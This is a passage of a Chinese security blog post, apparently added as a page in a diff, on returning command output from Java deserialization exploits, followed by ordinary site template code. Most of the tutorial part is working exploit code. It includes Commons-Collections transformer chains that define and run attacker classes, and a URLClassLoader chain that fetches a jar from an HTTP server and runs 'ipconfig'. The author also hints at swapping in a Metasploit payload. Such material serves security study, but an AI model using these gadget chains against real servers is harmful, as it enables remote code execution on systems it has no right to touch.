System.out.println(filetoBytes.FiletoBytes(file_name,bytes));</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<blockquote>
+<p>温馨提示：在转文件的时候最好先看看文件大小，传入合适的数组大小。因为后面这些多余出0要删除，否则会报错。<br><img src="https://img-blog.csdnimg.cn/2020060510594243.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<hr>
+<h2 id="defineclass’s-demo"><a href="#defineclass’s-demo" class="headerlink" title="defineclass’s demo"></a>defineclass’s demo</h2><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String classname = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// 部分字节码，完整获取github。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]{</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>,};</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用反射的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>{</span><br><span class="line">        defineclass defineclass = <span class="keyword">new</span> defineclass();</span><br><span class="line">        Class cls = defineclass.defineClass(classname,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance("whoami");</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200605110551596.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="ccdefineclass"><a href="#ccdefineclass" class="headerlink" title="ccdefineclass"></a>ccdefineclass</h2><p>   改写cc链，来达到获取回显。这里有一个坑，JDK自带<code>java.lang.ClassLoader</code>类下的defineclass是权限是<code>protected</code>不能直接通过反射调用，故不顾虑使用这个类，笔者使用的是weblogic中的<code>wlfullclient.jar!.org.mozilla.classfile.DefiningClassLoader</code>。<br>笔者这里只给出部分实现代码。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> Transformer[] transformers = <span class="keyword">new</span> Transformer[] {</span><br><span class="line"><span class="comment">//                new ConstantTransformer(ClassLoader.class),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]{Class[]<span class="class">.<span class="keyword">class</span>},</span></span><br><span class="line">                        new Object[]{new Class[0]}),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]{Object[]<span class="class">.<span class="keyword">class</span>},</span></span><br><span class="line">                        new Object[]{new Object[0]}),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]{String.class,byte[].class},</span><br><span class="line">                        <span class="keyword">new</span> Object[]{<span class="string">"summer.classload.Summer"</span>,bytes}),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]{},</span><br><span class="line">                        <span class="keyword">new</span> Object[]{}),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"Exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]{String<span class="class">.<span class="keyword">class</span>},</span></span><br><span class="line">                        new Object[]{"ipconfig"}),</span><br><span class="line">        };</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h1 id="URLClassLoader远程加载文件回显"><a href="#URLClassLoader远程加载文件回显" class="headerlink" title="URLClassLoader远程加载文件回显"></a>URLClassLoader远程加载文件回显</h1><p>   URLClassLoader是<code>java.net</code>下的类，继承了<code>java.lang.Classloader</code>类对象。URLClassLoader可以从远端或者本地加载jar/class文件。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200605154823661.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="URLClassLoader’s-Demo"><a href="#URLClassLoader’s-Demo" class="headerlink" title="URLClassLoader’s Demo"></a>URLClassLoader’s Demo</h2><ol>
+<li>编写exp代码，代码已经上传至GitHub项目中。</li>
+<li>编译<code>javac Summer.java</code></li>
+<li>创建http服务 <code>py -2 -m SimpleHTTPServer  8090</code></li>
+</ol>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>{</span><br><span class="line"></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1:8090/summer.jar"</span>);</span><br><span class="line"><span class="comment">//        URL url = new URL("file:e:/summer.jar");</span></span><br><span class="line"></span><br><span class="line">        URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]{url});</span><br><span class="line">        Class cls = ucl.loadClass(<span class="string">"Summer"</span>);</span><br><span class="line">        Method m = cls.getMethod(<span class="string">"Exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">"ipconfig"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200605160339489.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200605170754423.gif" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="CCURLClassLoader"><a href="#CCURLClassLoader" class="headerlink" title="CCURLClassLoader"></a>CCURLClassLoader</h2><p>   同样使用cc链来改造此回显方法，<code>试想一下把这个jar换成msf的payload可以达到什么效果呢？</code>这里我不实现，自己可以去脑洞实现一下，很简单的，我相信看过我文章的人都应该会。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] {</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(URLClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]{Class[]<span class="class">.<span class="keyword">class</span>},</span></span><br><span class="line">                        new Object[]{new Class[]{URL[].class}}),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]{Object[]<span class="class">.<span class="keyword">class</span>},</span></span><br><span class="line">                        new Object[]{new Object[]{new URL[]{new URL("http://127.0.0.1:8090/summer.jar")}}}),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"loadClass"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]{String<span class="class">.<span class="keyword">class</span>},</span></span><br><span class="line">                        new Object[]{"summer"}),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getConstructor"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]{Class[]<span class="class">.<span class="keyword">class</span>},</span></span><br><span class="line">                        new Object[]{new Class[]{String.class}}),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]{Object[]<span class="class">.<span class="keyword">class</span>},</span></span><br><span class="line">                        new Object[]{new String[]{"ipconfig"}})</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        };</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>   笔者这里总结都是以CC链为改造基础，其实CC还有很多玩法，大家可以脑洞一下，Java反序列化回显也不止本文中两种，比例说RMI、weblogic的T3协议。学习无止境，努力就完事。</p>
+<p><code>于无常处知有情，于有情处知众生..........</code></p>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://javasec.org/javase/ClassLoader/" target="_blank" rel="noopener">https://javasec.org/javase/ClassLoader/</a><br><a href="https://xz.aliyun.com/t/7740" target="_blank" rel="noopener">https://xz.aliyun.com/t/7740</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">SummerSec</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">SummerSec</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">Java 反序列化</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/07/01/Windows%20Terminal%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/1.jpg" class="responsive-img" alt="Windows Terminal 配置文件">
+                        
+                        <span class="card-title">Windows Terminal 配置文件</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">Java 反序列化</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/05/26/%E6%BC%AB%E8%B0%88Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/4.jpg" class="responsive-img" alt="漫谈Commons-Collections反序列化">
+                        
+                        <span class="card-title">漫谈Commons-Collections反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            SummerSec
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Java-Commons-Collections/">
+                        <span class="chip bg-color">Java Commons-Collections</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.5'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2018-2021</span>
+            
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">SummerSec</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">112k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2018";
+                    var startMonth = "6";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/SummerSec" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:summersec@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/SecSummers" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/SecSummers" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
